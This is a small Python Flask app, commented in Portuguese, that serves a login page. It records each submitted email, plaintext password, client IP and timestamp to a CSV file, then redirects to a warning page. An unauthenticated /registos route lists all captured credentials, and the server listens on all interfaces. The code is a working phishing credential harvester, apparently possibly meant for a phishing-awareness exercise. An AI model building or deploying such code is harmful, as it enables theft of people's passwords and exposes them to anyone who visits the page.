from flask import Flask, render_template, request, redirect, url_for
import csv
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        ip = request.remote_addr  # Capturar o endereço IP do cliente

        # Guardar os dados no ficheiro CSV
        with open("registos.csv", mode="a", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)
            writer.writerow([datetime.now(), email, password, ip])  # Adicionar o IP ao registo

        # Redireciona para a página de aviso
        return redirect(url_for("aviso"))

    return render_template("index.html")

@app.route("/aviso")
def aviso():
    return render_template("aviso.html")

@app.route("/registos")
def mostrar_registos():
    registos = []
    try:
        with open("registos.csv", newline="", encoding="utf-8") as file:
            reader = csv.reader(file)
            for row in reader:
                registos.append(row)
    except FileNotFoundError:
        registos = []

    return render_template("registos.html", registos=registos)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
